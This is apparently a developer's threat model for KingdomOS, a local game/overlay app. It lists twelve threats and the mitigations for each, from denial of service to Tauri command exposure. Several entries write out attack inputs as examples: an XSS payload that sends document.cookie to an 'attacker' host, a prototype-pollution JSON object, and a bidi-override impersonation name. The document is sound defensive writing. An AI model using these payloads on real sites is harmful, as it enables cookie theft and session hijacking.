# KingdomOS — Security & Threat Model

KingdomOS runs locally and accepts external input from several channels (file watchers, JSON inbox, optional HTTP, Twitch event mappers). Most of that input is *not* trusted. This document lists the threats we considered and the mitigations in place.

If you ship KingdomOS as a Steam product or a streamer overlay, this is the bar you've already cleared.

---

## Threats and mitigations

### T1: DoS via oversized event labels / payloads
**Vector:** Drop a 10 MB JSON file in the inbox; POST a 50 MB body to the optional HTTP endpoint; scripted curl loop spamming gigantic event payloads.
**Mitigation:**
- `EventSchema` caps `label` at 120 chars, IDs at 64, landmarks at 64. Any string >4× cap is rejected outright.
- `duration_ms` capped at 5 minutes.
- Inbox file size cap (Tauri side) prevents memory bombs.
- Save size cap of 4 MB on localStorage read.
**Verified by:** `src/sim/events/EventSchema.test.ts`, `src/sim/Persistence.test.ts`.

### T2: DoS via event flood (Twitch raid spam, scripted curl loop)
**Vector:** Twitch raid event with 1 000 000 viewers spawning a million villagers; scripted POST loop hammering the bus.
**Mitigation:**
- Runtime caps: 200 NPCs, 100 effects, 50 couriers, 4 pets. Cap-hit returns early on `pushNpc`; oldest-wins eviction on effects/couriers.
- Event bus buffer caps at 200; oldest entries roll off.
- Twitch mappers clamp viewer count to [1, 10 000] and bits to [1, 50 000] before they ever reach the world.
**Verified by:** `src/sim/Stress.test.ts` (10 tests, 5000-tick perf check).

### T3: NaN / Infinity / type confusion crashes
**Vector:** `{ "v": 1, "intensity": NaN, "duration_ms": Infinity, "ts": -1 }`
**Mitigation:**
- Zod schema rejects non-finite numbers, negative timestamps, future timestamps beyond 2_000_000_000.
- `intensity` clamped to [0, 1].
- `safeNumber` / `safeInt` helpers in `validateSave` clamp to safe ranges, fall back to defaults.
**Verified by:** EventSchema 18 tests, Persistence 15 tests.

### T4: Prototype pollution via event meta keys
**Vector:** `{ "payload": { "meta": { "__proto__": { "isAdmin": true }, "constructor": "evil" } } }`
**Mitigation:**
- `DANGEROUS_META_KEYS = ["__proto__", "constructor", "prototype"]` — these are dropped before the object is built.
- Nested objects/arrays in meta values are flattened to JSON-stringified strings capped at 200 chars.
- Tested with `Object.prototype.hasOwnProperty.call(m, "__proto__") === false` (not `m.__proto__` which would return Object.prototype).
**Verified by:** EventSchema "drops dangerous meta keys" test.

### T5: Cross-site scripting via journal / HUD / event labels
**Vector:** `payload.label = "<img src=x onerror=fetch('http://attacker/'+document.cookie)>"`
**Mitigation:**
- React auto-escapes all text rendered via `{e.text}` etc.
- Pixi `Text` renders via Canvas2D — never interprets HTML.
- `sanitizeName` strips `<[a-zA-Z]...>` patterns at input time as belt-and-suspenders.
- No `dangerouslySetInnerHTML` anywhere in the codebase.
**Verified by:** `src/lib/sanitize.test.ts` "strips HTML tags".

### T6: Unicode bidi / zero-width name impersonation
**Vector:** Twitch displayname `Roan‮drowsaP` (RIGHT-TO-LEFT OVERRIDE inside) renders as `Roan**Password**` in a courier journal entry, tricking the user.
**Mitigation:**
- `sanitizeName` strips all bidi-override / zero-width / control characters before display.
- Applied at every input boundary: onboarding, Twitch mappers, save validation.
- Char-class regex built at runtime via `String.fromCharCode` so source bytes never bit-rot.
**Verified by:** sanitize tests "strips bidi override characters" + "strips zero-width characters".

### T7: localStorage tampering / hostile save file import
**Vector:** User edits `localStorage["kingdomos.kingdom.v1"]` or imports a `.kingdomos.json` from an attacker.
**Mitigation:**
- `validateSave(unknown)` rebuilds the save object from scratch with type-checked, range-clamped fields.
- Unknown NPC roles dropped. Unknown achievement kinds dropped. Unknown artifact kinds dropped.
- 500 NPC cap on roster, 5000 journal cap, 200 achievement cap, 200 artifact cap from save.
- `foundedAtMs` clamped to [2020-01-01, now+1day] — no time-travel kingdoms.
- Future-dated save versions trigger migration scaffold; older versions can be lifted forward, future versions return null.
- 4 MB hard cap on save string size.
**Verified by:** `src/sim/Persistence.test.ts` (15 tests, including "caps NPC roster at 500", "drops NPCs with unknown roles", "clamps NaN/Infinity positions").

### T8: Reserved username impersonation
**Vector:** Twitch user named `system` or `narrative` appears in journal entries indistinguishable from real internal events.
**Mitigation:**
- `sanitizeTwitchUser` substitutes `viewer` for the strings `system` and `narrative`.
- Internal event sources can only be set by code that already has world access — external input can only claim sources from the allowlist enum.

### T9: Race in `resetKingdom` (formerly resulted in stale save persistence)
**Vector:** User clicks "Found new kingdom" → resetKingdom removes localStorage entry, then triggers `location.reload()`. Before the reload completes, the `beforeunload` autosave handler fires and rewrites the old kingdom back into storage.
**Mitigation:**
- `window.__kingdomos_skip_save = true` sentinel set inside `resetKingdom` and `commitImportedSave`.
- `doSave` checks the sentinel and returns early if set.
- Once reload completes the sentinel is naturally gone.

### T10: Long-running session memory leak
**Vector:** App left running for days with continuous events. Internal collections grow without bound; eventually OOM.
**Mitigation:**
- Audited every internal collection (per system) for unbounded growth.
- Treasury was previously leaking on `acquire()`; fixed by enforcing the 200 cap on insertion.
- Sim layers (EntityLayer, TileRenderer, WeatherLayer) use reconcile + pool patterns; sprite count is bounded by what's on screen.
- Stress suite includes a 5000-tick check; if any leak gets reintroduced, perf degrades visibly and CI flags it.
**Verified by:** `src/sim/Stress.test.ts` perf test + memory audit notes in `docs/TESTING.md`.

### T11: Local HTTP server abuse
**Vector:** Anyone on the local machine can `curl localhost:17820/events` if the optional `http-server` Rust feature is built and enabled.
**Mitigation:**
- HTTP receiver binds 127.0.0.1 only — never 0.0.0.0.
- Disabled by default; requires both a feature-flag build and a Settings toggle.
- Same EventSchema validation as every other channel.
- No commands beyond event-posting are exposed.
- **Future hardening (not yet shipped):** require a per-session token in an Authorization header.

### T12: Tauri command exposure
**Vector:** Malicious page loaded in the Tauri webview invokes elevated commands.
**Mitigation:**
- Tauri capability file (`src-tauri/capabilities/default.json`) limits which window labels can invoke which commands.
- All custom commands (`toggle_overlay_mode`, `quit_app`, etc.) take no privileged paths and only mutate window state.
- CSP set to `null` (default open) because we load no external content — if you ever add a remote URL load, set a strict CSP.

---

## Reporting an issue

If you find a security issue in shipped KingdomOS, please email me directly rather than opening a public issue. For a project at this scale that's `jonathan.a.barnett@gmail.com`.

## Known acceptable risks

- **No code signing on Windows builds.** Steam handles its own integrity check; itch.io builds may flag SmartScreen on first run.
- **No telemetry whatsoever.** This is a deliberate choice. We never see what's happening in your kingdom. The cost is we can't proactively fix crashes; the benefit is total privacy.
- **localStorage on a shared computer is readable by any user with browser-dev-tools access.** Don't store anything in a KingdomOS save that you wouldn't write on a postcard.
